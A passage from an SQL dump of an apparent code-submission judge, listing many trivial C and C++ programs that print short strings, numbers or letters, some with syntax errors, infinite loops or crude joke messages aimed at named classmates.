('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 456),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 457),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"120\"<<endl;\r\n	return 0;\r\n}', 458),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 459),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 460),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\";\r\n	return 0;\r\n}', 461),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\";\r\n	return 0;\r\n}', 462),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\";\r\n	return 0;\r\n}', 463),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 464),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"120\"<<endl;\r\n	return 0;\r\n}', 465),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 466),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 467),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 468),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 469),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 470),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 471),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 472),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 473),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 474),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl\r\n	return 0;\r\n}', 475),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 476),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 477),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 478),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 479),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 480),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 481),
('RakibulRanak', '#include<srdio.h>\r\nint main()\r\n{\r\nprintf(\"hi)\r\n}', 482),
('RakibulRanak', '#include<srdio.h>\r\nint main()\r\n{\r\nprintf(\"hi)\r\n}', 483),
('RakibulRanak', '#include<srdio.h>\r\nint main()\r\n{\r\nprintf(\"hi)\r\n}', 484),
('RakibulRanak', '#include<srdio.h>\r\nint main()\r\n{\r\nprintf(\"hi)\r\n}', 485),
('RakibulRanak', '#include<srdio.h>\r\nint main()\r\n{\r\nprintf(\"hi)\r\n}', 486),
('RakibulRanak', '#include<srdio.h>\r\nint main()\r\n{\r\nprintf(\"hi)\r\n}', 487),
('RakibulRanak', '#include<srdio.h>\r\nint main()\r\n{\r\nprintf(\"hi)\r\n}', 488),
('RakibulRanak', '#include<srdio.h>\r\nint main()\r\n{\r\nprintf(\"hi)\r\n}', 489),
('RakibulRanak', '#include<srdio.h>\r\nint main()\r\n{\r\nprintf(\"hi)\r\n}', 490),
('RakibulRanak', '#include<srdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\");\r\n}', 491),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\");\r\n}', 492),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\");\r\n}', 493),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\")\r\n}', 494),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\")\r\n}', 495),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"hi\")\r\n}', 496),
('4', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 497),
('4', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Mal sob sesh\"<<endl\r\n	return 0;\r\n}', 498),
('4', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Mal sob sesh\"<<endl;\r\n	return 0;\r\n}', 499),
('4', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"120\n\");\r\n}', 500),
('4', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Pagol Hoye Jabo\"<<endl;\r\n	return 0;\r\n}', 501),
('4', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Hello World\"<<endl;\r\n	return 0;\r\n}', 502),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Hello World\"<<endl\r\n	return 0;\r\n}', 503),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Hello World\"<<endl;\r\n	return 0;\r\n}', 504),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nwhile(1){\r\n}\r\n	cout<<\"vuda venge debo\"<<endl;\r\n\r\n	return 0;\r\n}', 505),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nwhile(1){\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\n}\r\n\r\n	return 0;\r\n}', 506),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(i<10){\r\n\r\n	cout<<\"vuda\"<<endl;\r\ni++;\r\n}\r\n	return 0;\r\n}', 507),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\nint i=0;\r\nwhile(i<100)\r\n{\r\ncout<<i<<endl;\r\ni++;\r\n}\r\n}', 508),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\nint i=0;\r\nwhile(i<100)\r\n{\r\ncout<<i<<endl;\r\ni++;\r\n}\r\n}', 509),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\nint i=0;\r\nwhile(1)\r\n{\r\n//cout<<i<<endl;\r\ni++;\r\n}\r\n}', 510),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\nint i=0;\r\nwhile(i<100000)\r\n{\r\ncout<<i<<endl;\r\ni++;\r\n}\r\n}', 511),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(i<1000000){\r\n\r\n\r\n\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\ni++;\r\n}\r\n	return 0;\r\n}', 512),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(i<1000000){\r\n\r\n\r\n\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\ni++;\r\n}\r\n	return 0;\r\n}', 513),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(i<1000000){\r\n\r\n\r\n\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\ni++;\r\n}\r\n	return 0;\r\n}', 514),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(i<1000000){\r\n\r\n\r\n\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\ni++;\r\n}\r\n	return 0;\r\n}', 515),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(i<1000000){\r\n\r\n\r\n\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\ni++;\r\n}\r\n	return 0;\r\n}', 516),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(i<1000000){\r\n\r\n\r\n\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\ni++;\r\n}\r\n	return 0;\r\n}', 517),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(i<1000000){\r\n\r\n\r\n\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\ni++;\r\n}\r\n	return 0;\r\n}', 518),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(i<1000000){\r\n\r\n\r\n\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\ni++;\r\n}\r\n	return 0;\r\n}', 519),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\nint i=0;\r\nwhile(i<1000000){\r\n\r\n\r\n\r\n\r\n	cout<<\"vuda venge debo\"<<endl;\r\ni++;\r\n}\r\n	return 0;\r\n}', 520),
('maraz', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"Ami mobin ,,,, ami kheli\n\";\r\n}', 521),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n	ios_base::sync_with_stdio(false);\r\n	cin.tie(NULL);\r\n	\r\n	cout << \"Ami mobin ,,,, ami kheli\" << endl;\r\n\r\n\r\n	return 0;\r\n}', 522),
('Souhardya Saha', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n    cout << \"Ami mobin ,,,, ami kheli\" << endl;\r\n}', 523),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n	ios_base::sync_with_stdio(false);\r\n	cin.tie(NULL);\r\n	\r\n	cout << \"Ami pulock ,,,, ami gai\" << endl;\r\n\r\n\r\n	return 0;\r\n}', 524),
('maraz', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"Ami pulock ,,,, ami gai\n\";\r\n}', 525),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n	ios_base::sync_with_stdio(false);\r\n	cin.tie(NULL);\r\n	\r\n	cout << \"Ami emon...omanush\" << endl;\r\n\r\n\r\n	return 0;\r\n}', 526),
('100', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main(){\r\n	cout << \"Ami mobin ,,,, ami kheli\" << endl;\r\n	return 0;\r\n}\r\n', 527),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n	ios_base::sync_with_stdio(false);\r\n	cin.tie(NULL);\r\n	\r\n	cout << \"Ami maraz...ami male escort hote chai\" << endl;\r\n\r\n\r\n	return 0;\r\n}', 528),
('Souhardya Saha', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n cout << \"Ami pulock ,,,, ami gai\" << endl;\r\n}', 529),
('100', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main(){\r\n	cout << \"Ami mobin ,,,, ami kheli\" << endl;\r\n	return 0;\r\n}\r\n', 530),
('maraz', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"Ami emon...omanush\n\";\r\n}', 531),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n	ios_base::sync_with_stdio(false);\r\n	cin.tie(NULL);\r\n	\r\n	cout << \"ami face recognition niye kaj kortesi\" << endl;\r\n\r\n\r\n	return 0;\r\n}', 532),
('100', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main(){\r\n	cout << \"Ami pulock ,,,, ami gai\" << endl;\r\n	return 0;\r\n}\r\n', 533),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n	ios_base::sync_with_stdio(false);\r\n	cin.tie(NULL);\r\n	\r\n	cout << \"My cock is white\" << endl;\r\n\r\n\r\n	return 0;\r\n}', 534),
('100', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main(){\r\n	cout << \"Ami emon...omanush\" << endl;\r\n	return 0;\r\n}\r\n', 535),
('maraz', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"Ami maraz...ami male escort hote chai\n\";\r\n}', 536),
('Souhardya Saha', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n    cout << \"Ami pulock ,,,, ami gai\" << endl;\r\n}\r\n', 537),
('100', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main(){\r\n	cout << \"Ami maraz...ami male escort hote chai\" << endl;\r\n	return 0;\r\n}\r\n', 538),
('Souhardya Saha', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n    cout << \"Ami emon...omanush\" << endl;\r\n}\r\n', 539),
('Souhardya Saha', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n    cout << \"Ami maraz...ami male escort hote chai\" << endl;\r\n}\r\n', 540),
('maraz', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"Ami face recognition niye kaj kortesi\n\";\r\n}', 541),
('100', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main(){\r\n	cout << \"My cock is white\" << endl;\r\n	return 0;\r\n}\r\n', 542),
('Souhardya Saha', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n    cout << \"ami face recognition niye kaj kortesi\" << endl;\r\n}\r\n', 543),
('100', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main(){\r\n	cout << \"Ami mobin ,,,, ami kheli\" << endl;\r\n	return 0;\r\n}\r\n', 544),
('Souhardya Saha', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n    cout << \"My cock is white\" << endl;\r\n}\r\n', 545),
('maraz', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"Ami face recognition niye kaj kortesi\n\";\r\n}', 546),
('100', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main(){\r\n	cout << \"Ami pulock ,,,, ami gai\" << endl;\r\n	return 0;\r\n}\r\n', 547),
('100', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main(){\r\n	cout << \"ami face recognition niye kaj kortesi\" << endl;\r\n	return 0;\r\n}\r\n', 548),
('maraz', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"ami face recognition niye kaj kortesi\n\";\r\n}', 549),
('shaswata56', '#include <stdio.h>\r\n\r\nint main()\r\n{\r\nprintf(\"Ami mobin ,,,, ami kheli\n\");\r\nreturn 0;\r\n}', 550),
('maraz', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"My cock is white\n\";\r\n}', 551),
('shaswata56', '#include <stdio.h>\r\n\r\nint main()\r\n{\r\nprintf(\"Ami pulock ,,,, ami gai\n\");\r\nreturn 0;\r\n}', 552),
('100', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main(){\r\n	cout << \"ami face recognition niye kaj kortesi\" << endl;\r\n	return 0;\r\n}\r\n', 553),
('shaswata56', '#include <stdio.h>\r\n\r\nint main()\r\n{\r\nprintf(\"Ami emon...omanush\n\");\r\nreturn 0;\r\n}', 554),
('shaswata56', '#include <stdio.h>\r\n\r\nint main()\r\n{\r\nprintf(\"Ami maraz...ami male escort hote chai\n\");\r\nreturn 0;\r\n}', 555),
('shaswata56', '#include <stdio.h>\r\n\r\nint main()\r\n{\r\nprintf(\"ami face recognition niye kaj kortesi\n\");\r\nreturn 0;\r\n}', 556),
('shaswata56', '#include <stdio.h>\r\n\r\nint main()\r\n{\r\nprintf(\"My cock is white\n\");\r\nreturn 0;\r\n}', 557),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 558),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 559),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Ami mobin ,,,, ami kheli\"<<endl;\r\n	return 0;\r\n}', 560),
('RakibulRanak', 'sx', 561),
('RakibulRanak', 'sx', 562),
('RakibulRanak', 'sx', 563),
('RakibulRanak', 'sx', 564),
('RakibulRanak', 'sx', 565),
('RakibulRanak', 'sx', 566),
('RakibulRanak', 'sx', 567),
('RakibulRanak', 'sx', 568),
('RakibulRanak', 'a', 569),
('RakibulRanak', '#include<stdio.h>\r\n\r\nint main(){\r\nprintf(\"10\n\");\r\nreturn 0;\r\n}', 570),
('RakibulRanak', '#include<stdio.h>\r\n\r\nint main(){\r\nprintf(\"10\n\");\r\nreturn 0;\r\n}', 571),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<10<<endl;\r\n}', 572),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<10<<endl;\r\n}', 573),
('RakibulRanak', '#include<stdio.h>\r\n\r\nint main()\r\n{\r\n   printf(\"10\n\");\r\n}', 574),
('RakibulRanak', '#include<stdio.h>\r\n\r\nint main()\r\n{\r\n   printf(\"10\n\");\r\n}', 575),
('RakibulRanak', '#include<stdio.h>\r\n\r\nint main()\r\n{\r\n   printf(\"Hello\n\");\r\n}', 576),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"wdc\"<<endl;\r\n	return 0;\r\n}', 577),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Hello\";\r\n	return 0;\r\n}', 578),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Hello\";\r\n	return 0;\r\n}', 579),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"wdc\"<<endl;\r\n	return 0;\r\n}', 580),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Hello\"<<endl;\r\n	return 0;\r\n}', 581),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"hello\"<<endl;\r\n	return 0;\r\n}', 582),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"hello\"<<endl;\r\n	return 0;\r\n}', 583),
('1', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"1\n\");\r\n}', 584),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"1\n\");\r\n}', 585),
('2', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"1\n\");\r\n}', 586),
('2', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"1\n\");\r\n}', 587),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"A\"<<endl;\r\n	return 0;\r\n}', 588),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"A\"<<endl;\r\n	return 0;\r\n}', 589),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"C\"<<endl;\r\n	return 0;\r\n}', 590),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"D\"<<endl;\r\n	return 0;\r\n}', 591),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n\r\n{\r\nprintf(\"C\n\");\r\n}', 592),
('RakibulRanak', 'int main()\r\n{ cout<<A<<endl;\r\n}', 593),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{ cout<<A<<endl;\r\n}', 594),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{ cout<<\"A\"<<endl;\r\n}', 595),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{ cout<<\"B\"<<endl;\r\n}', 596),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{ cout<<\"B\"<<endl;\r\n}', 597),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"C\"<<endl;\r\n	return 0;\r\n}', 598),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"C\"<<endl;\r\n	return 0;\r\n}', 599),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"C\"<<endl;\r\n	return 0;\r\n}', 600),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"C\"<<endl;\r\n	return 0;\r\n}', 601),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"C\"<<endl;\r\n	return 0;\r\n}', 602),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"B\"<<endl;\r\n	return 0;\r\n}', 603),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"C\"<<endl;\r\n	return 0;\r\n}', 604),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"C\"<<endl;\r\n	return 0;\r\n}', 605),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"C\"<<endl;\r\n	return 0;\r\n}', 606),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"D\"<<endl;\r\n	return 0;\r\n}', 607),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"C\"<<endl;\r\n	return 0;\r\n}', 608),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"D\"<<endl;\r\n	return 0;\r\n}', 609),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"C\"<<endl;\r\n	return 0;\r\n}', 610),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"C\"<<endl;\r\n	return 0;\r\n}', 611),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"D\"<<endl;\r\n	return 0;\r\n}', 612),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"D\"<<endl;\r\n	return 0;\r\n}', 613),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"A\"<<endl;\r\n}', 614),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"A\"<<endl;\r\n}', 615),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"B\"<<endl;\r\n}', 616),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"A\"<<endl;\r\n}', 617),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"A\"<<endl;\r\n}', 618),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"B\"<<endl;\r\n}', 619),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"A\"<<endl;\r\n}', 620),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"C\"<<endl;\r\n}', 621),
('RakibulRanak', 'gh', 622),
('RakibulRanak', 'fvgjcv', 623),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"A\"<<endl;\r\n\r\n}', 624),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"A\"<<endl;\r\n\r\n}', 625),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"A\"<<endl;\r\n\r\n}', 626),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"B\"<<endl;\r\n\r\n}', 627),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"A\"<<endl;\r\n\r\n}', 628),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"B\"<<endl;\r\n\r\n}', 629),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"C\n\");\r\n}', 630),
('2', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"D\n\");\r\n}', 631),
('2', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"B\n\");\r\n}', 632),
('3', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"A\n\");\r\n}', 633),
('RakibulRanak', '#include<stdio.h>\r\nint main()\r\n{\r\nprintf(\"C\n\");\r\nchanged;\r\n}', 634);

-- --------------------------------------------------------

--
-- Table structure for table `codes`
--

CREATE TABLE `codes` (
  `submit_name` varchar(50) DEFAULT NULL,
  `source_code` longtext DEFAULT NULL,
  `id` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `codes`
--

INSERT INTO `codes` (`submit_name`, `source_code`, `id`) VALUES
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<16<<endl<<36<<endl;\r\n}', 323),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<16<<endl<<36<<endl;\r\n}', 324),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<16<<endl<<36<<endl;\r\n}', 325),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<16<<endl<<36<<endl;\r\n}', 326),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<16<<endl<<37<<endl;\r\n}', 327),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<16<<endl<<37<<endl;\r\n}', 328),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<16<<endl<<37<<endl;\r\n}', 329),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<17;\r\n}', 330),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<\"17\";\r\n}', 331),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<\"17ww\";\r\n}', 332),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<\"17wwww\";\r\n}', 333),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<\"17wwwwwww\";\r\n}', 334),
